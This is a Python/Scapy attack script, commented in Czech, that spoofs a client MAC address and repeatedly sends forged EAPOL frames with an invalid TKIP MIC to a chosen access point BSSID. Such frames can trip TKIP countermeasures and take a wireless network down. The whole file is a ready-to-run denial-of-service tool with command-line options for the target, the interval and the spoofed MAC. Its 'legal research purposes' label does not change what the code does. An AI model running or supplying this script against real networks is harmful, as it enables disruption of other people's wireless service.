#!/usr/bin/env python3
from scapy.all import *
import argparse
import time
import random

def random_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0x00, 0x7f),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
    )

def send_mic_failure(iface, bssid, delay, client_mac=None):
    print(f"[+] Spouštím MIC Failure útok na BSSID {bssid} skrz {iface}")
    if not client_mac:
        client_mac = random_mac()
    print(f"[+] Používám klientskou MAC adresu {client_mac}")
    
    dot11 = Dot11(
        type=2,
        subtype=0,
        addr1=bssid,      # Access Point
        addr2=client_mac,  # Fake client
        addr3=bssid
    )
    
    # Statický payload jako v originále (můžeš zlepšit replay counter)
    payload = bytes.fromhex(
        "888e"          # EAPOL Ethertype
        "0203005f0103005a"  # TKIP handshake frame header (nesprávný MIC)
        "00000000000000000000000000000000"  # Replay counter a další hlavičky
        + "00" * 90       # padding
    )

    frame = RadioTap() / dot11 / LLC(dsap=0xaa, ssap=0xaa, ctrl=3) / SNAP(OUI=0x000000, code=0x888e) / Raw(load=payload)

    while True:
        sendp(frame, iface=iface, verbose=0)
        print(f"[*] MIC Failure rámec odeslán na {bssid}")
        time.sleep(delay)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MIC Failure (TKIP) Exploit - LEGÁLNÍ VÝZKUMNÉ ÚČELY")
    parser.add_argument("-a", "--bssid", required=True, help="Cílové BSSID (AP MAC adresa)")
    parser.add_argument("--tkip", action="store_true", help="Spustí TKIP MIC Failure exploit")
    parser.add_argument("--delay", type=float, default=1.0, help="Zpoždění mezi rámci (s)")
    parser.add_argument("-c", "--client-mac", help="Klientská MAC adresa (fake)")

    parser.add_argument("iface", help="Bezdrátové rozhraní v monitor módu")

    args = parser.parse_args()

    if args.tkip:
        try:
            send_mic_failure(args.iface, args.bssid, args.delay, args.client_mac)
        except KeyboardInterrupt:
            print("\n[!] Ukončeno uživatelem.")
    else:
        print("Použij příznak --tkip pro spuštění TKIP MIC Failure útoku.")
